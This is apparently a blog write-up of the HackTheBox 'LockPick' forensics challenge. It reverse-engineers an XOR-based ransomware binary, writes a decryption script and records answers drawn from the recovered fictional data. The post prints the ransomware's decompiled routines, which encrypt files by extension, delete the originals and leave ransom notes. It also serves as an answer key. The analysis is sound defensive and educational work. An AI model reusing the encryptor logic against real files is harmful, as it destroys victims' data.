---
layout: post
author: Julio
date: 08-05-2024
title: LockPick Write-Up
---

<div class="center"><img src="https://labs.hackthebox.com/storage/challenges/11b921ef080f7736089c757404650e40.png" width="350"></div>

# LockPick Write-Up

## Introduction

<p>LockPick is an "Easy" sherlock challenge on HackTheBox. This is the scenario:</p>

> Forela needs your help! A whole portion of our UNIX servers have been hit with what we think is ransomware. We are refusing to pay the attackers and need you to find a way to recover the files provided. Warning This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments. Once the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed.

<p>We start with a file called <custom-code>lockpick1.zip</custom-code> and we unzip it to get <custom-code>bescrypt.zip</custom-code> and a bunch of encrypted files inside a folder called <custom-code>forela-criticaldata</custom-code>. We can unzip the second compressed file with a password inside the <custom-code>DANGER.txt</custom-code> file. We will then get a Linux binary called <custom-code>bescrypt3.2</custom-code>.</p>

## Questions

### 1. Please confirm the encryption key string utilised for the encryption of the files provided?

<p>First, we can start analyzing the ELF file by opening it with Ghidra. By going to the main function, we can find the following disassembled code:</p>

```c
undefined8 main(void)

{
  process_directory("/forela-criticaldata/","bhUlIshutrea98liOp");
  return 0;
}
```

<p>As we don't know what the <custom-code>process_directory</custom-code> function does exactly, we can go to this function and read its code.</p>

```c
void process_directory(char *param_1,undefined8 param_2)

{
  int iVar1;
  char *pcVar2;
  char local_418 [1024];
  dirent *local_18;
  DIR *local_10;

  local_10 = opendir(param_1);
  if (local_10 == (DIR *)0x0) {
    printf("Error opening directory: %s\n",param_1);
  }
  else {
    while (local_18 = readdir(local_10), local_18 != (dirent *)0x0) {
      iVar1 = strcmp(local_18->d_name,".");
      if ((iVar1 != 0) && (iVar1 = strcmp(local_18->d_name,".."), iVar1 != 0)) {
        snprintf(local_418,0x400,"%s/%s",param_1,local_18->d_name);
        if (local_18->d_type == '\x04') {
          process_directory(local_418,param_2);
        }
        else if ((local_18->d_type == '\b') &&
                (((((pcVar2 = strstr(local_18->d_name,".txt"), pcVar2 != (char *)0x0 ||
                    (pcVar2 = strstr(local_18->d_name,".sql"), pcVar2 != (char *)0x0)) ||
                   (pcVar2 = strstr(local_18->d_name,".pdf"), pcVar2 != (char *)0x0)) ||
                  ((pcVar2 = strstr(local_18->d_name,".docx"), pcVar2 != (char *)0x0 ||
                   (pcVar2 = strstr(local_18->d_name,".xlsx"), pcVar2 != (char *)0x0)))) ||
                 ((pcVar2 = strstr(local_18->d_name,".csv"), pcVar2 != (char *)0x0 ||
                  ((pcVar2 = strstr(local_18->d_name,".json"), pcVar2 != (char *)0x0 ||
                   (pcVar2 = strstr(local_18->d_name,".xml"), pcVar2 != (char *)0x0)))))))) {
          printf("Encrypting: %s\n",local_418);
          encrypt_file(local_418,param_2);
        }
      }
    }
    closedir(local_10);
  }
  return;
}
```

<p>We see that it takes two arguments. The first one seems to be a directory and we can confirm that by reading the following line: <custom-code>local_10 = opendir(param_1);</custom-code>. Later on, we will see that it encrypts certain files based on their extension by using the <custom-code>encrypt_file(local_418,param_2)</custom-code> function. The first parameter seems to be the file to encrypt and the second seems to be the key.</p>
<p>We can then confirm that the key is <custom-code>bhUlIshutrea98liOp</custom-code> since the second parameter is the same as the one used in the first function we analyzed. Then, we can read the code of the <custom-code>encrypt_file()</custom-code> to understand how these files are being encrypted.</p>

```c
void encrypt_file(char *param_1,char *param_2)

{
  byte bVar1;
  ulong uVar2;
  int iVar3;
  size_t sVar4;
  char local_848 [1024];
  char local_448 [1032];
  FILE *local_40;
  void *local_38;
  size_t local_30;
  FILE *local_28;
  ulong local_20;

  local_28 = fopen(param_1,"rb");
  if (local_28 == (FILE *)0x0) {
    printf("Error opening file: %s\n",param_1);
  }
  else {
    fseek(local_28,0,2);
    local_30 = ftell(local_28);
    rewind(local_28);
    local_38 = malloc(local_30);
    fread(local_38,1,local_30,local_28);
    fclose(local_28);
    for (local_20 = 0; uVar2 = local_20, (long)local_20 < (long)local_30; local_20 = local_20 + 1) {
      bVar1 = *(byte *)((long)local_38 + local_20);
      sVar4 = strlen(param_2);
      *(byte *)((long)local_38 + local_20) = bVar1 ^ param_2[uVar2 % sVar4];
    }
    snprintf(local_448,0x400,"%s.24bes",param_1);
    local_28 = fopen(local_448,"wb");
    fwrite(local_38,1,local_30,local_28);
    fclose(local_28);
    free(local_38);
    snprintf(local_848,0x400,"%s_note.txt",local_448);
    local_40 = fopen(local_848,"w");
    if (local_40 == (FILE *)0x0) {
      printf("Error creating note file: %s\n",local_848);
    }
    else {
      fwrite("This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com  to discuss payment for us providing you the decryption software..\n"
             ,1,0x99,local_40);
      fclose(local_40);
    }
    iVar3 = remove(param_1);
    if (iVar3 != 0) {
      printf("Error deleting original file: %s\n",param_1);
    }
  }
  return;
}
```

<p>The following line is what we are interested here: <custom-code>*(byte *)((long)local_38 + local_20) = bVar1 ^ param_2[uVar2 % sVar4];</custom-code>. Judging by its syntax, the code seems to be performing XOR encryption. We can create a Python script to decrypt all the files that end with ".24bes" - i.e. the extension used by the ransomware.</p>

```python
#!/usr/bin/python3

import os

files = []
key = "bhUlIshutrea98liOp"

def listFiles():
    my_files = os.listdir(".")
    for file in my_files:
        try:
            if file.split(".")[2] == "24bes":
                files.append(file)
        except:
            pass

def decryptFiles():
    for file in files:
        with open(file, "rb") as encrypted_file:
            data = encrypted_file.read()
            key_bytes = key.encode("utf-8")
            decrypted_data = bytes([byte ^ key_bytes[i % len(key_bytes)] for i, byte in enumerate(data)])

            print(f'[!] Decrypting {file}...')
            with open(file + ".decrypted", "wb") as d_file:
                d_file.write(decrypted_data)
                d_file.close()
            encrypted_file.close()

listFiles()
decryptFiles()
```

<p>After running it, we get the following output:</p>

```bash
python3 decrypt_files.py
[!] Decrypting complaints.csv.24bes...
[!] Decrypting sales_forecast.xlsx.24bes...
[!] Decrypting customer-feedback.json.24bes...
[!] Decrypting it_assets.xml.24bes...
[!] Decrypting forela_uk_applicants.sql.24bes...
[!] Decrypting trading-firebase_bkup.json.24bes...
```

### 2. We have recently recieved an email from wbevansn1@cocolog-nifty.com demanding to know the first and last name we have him registered as. They believe they made a mistake in the application process. Please confirm the first and last name of this applicant.

<p>We can run</p>

```bash
cat forela_uk_applicants.sql.24bes.decrypted | grep wbev
(830,'Walden','Bevans','wbevansn1@cocolog-nifty.com','Male','Aerospace Manufacturing','2023-02-16'),
```

<p>The right answer is <custom-code>Walden Bevans</custom-code>.</p>

### 3. What is the MAC address and serial number of the laptop assigned to Hart Manifould?

<p>We can </p>

```bash
xmllint --format it_assets.xml.24bes.decrypted | grep "Hart Mani" -A2 -B8
  <record>
    <asset_id>501</asset_id>
    <MAC>E8-16-DF-E7-52-48</MAC>
    <asset_type>laptop</asset_type>
    <serial_number>1316262</serial_number>
    <purchase_date>8/3/2022</purchase_date>
    <last_patch_date>1/6/2023</last_patch_date>
    <patch_status>pending</patch_status>
    <assigned_to>Hart Manifould</assigned_to>
    <location>Room 1156</location>
  </record>
```

<p>The right answer is <custom-code>E8-16-DF-E7-52-48, 1316262</custom-code>.</p>

### 4. What is the email address of the attacker?

<p>There are note files left. In any of the note files we can find the email address of the attacker and right answer, which is <custom-code>bes24@protonmail.com</custom-code>.</p>

### 5. City of London Police have suspiciouns of some insider trading taking part within our trading organisation. Please confirm the email address of the person with the highest profit percentage in a single trade alongside the profit percentage.

<p>We can</p>

```bash
cat trading-firebase_bkup.json.24bes.decrypted | jq '.[] | "\(.profit_percentage) belongs to \(.email)"' | cut -d " " -f 1 | cut -d '"' -f2 | cut -d "." -f1 | sort -g
[...snip]
48753
142303
```

<p>Then we grep</p>

```bash
cat trading-firebase_bkup.json.24bes.decrypted | jq '.[] | "\(.profit_percentage) belongs to \(.email)"' | grep 142303
"142303.1996053929628411706675436 belongs to fmosedale17a@bizjournals.com"
```

<p>The right answer is <custom-code>fmosedale17a@bizjournals.com, 142303.1996053929628411706675436</custom-code>.</p>

### 6. Our E-Discovery team would like to confirm the IP address detailed in the Sales Forecast log for a user who is suspected of sharing their account with a colleague. Please confirm the IP address for Karylin O'Hederscoll.

<p>When opening</p>

```
87	Karylin	O'Hederscoll	kohederscoll2e@dagondesign.com	Female	8.254.104.208	Pakistan	Consulting Hours	8/7/2022	983	1957,61	503,49	494930,67	1924330,63	1429399,96	415
```

<p>The right answer is <custom-code>8.254.104.208</custom-code>.</p>

### 7. Which of the following file extensions is not targeted by the malware? .txt, .sql,.ppt, .pdf, .docx, .xlsx, .csv, .json, .xml

<p>Going back to the first question, we see that the <custom-code>.ppt</custom-code> extension is not targeted. This is the right answer.</p>

### 8. We need to confirm the integrity of the files once decrypted. Please confirm the MD5 hash of the applicants DB.

<p></p>

```bash
md5sum forela_uk_applicants.sql.24bes.decrypted
f3894af4f1ffa42b3a379dddba384405  forela_uk_applicants.sql.24bes.decrypted
```

<p>The right answer is <custom-code>f3894af4f1ffa42b3a379dddba384405</custom-code>.</p>

### 9. We need to confirm the integrity of the files once decrypted. Please confirm the MD5 hash of the trading backup.

```bash
md5sum trading-firebase_bkup.json.24bes.decrypted
87baa3a12068c471c3320b7f41235669  trading-firebase_bkup.json.24bes.decrypted
```

<p>The right answer is <custom-code>87baa3a12068c471c3320b7f41235669</custom-code>.</p>

### 10. We need to confirm the integrity of the files once decrypted. Please confirm the MD5 hash of the complaints file.

```bash
md5sum complaints.csv.24bes.decrypted
c3f05980d9bd945446f8a21bafdbf4e7  complaints.csv.24bes.decrypted
```

<p>The right answer is <custom-code>c3f05980d9bd945446f8a21bafdbf4e7</custom-code>.</p>

## References

- <a href="https://app.hackthebox.com/sherlocks/Recollection">https://app.hackthebox.com/sherlocks/Lockpick</a>
- <a href="https://ghidra-sre.org/">https://ghidra-sre.org/</a>
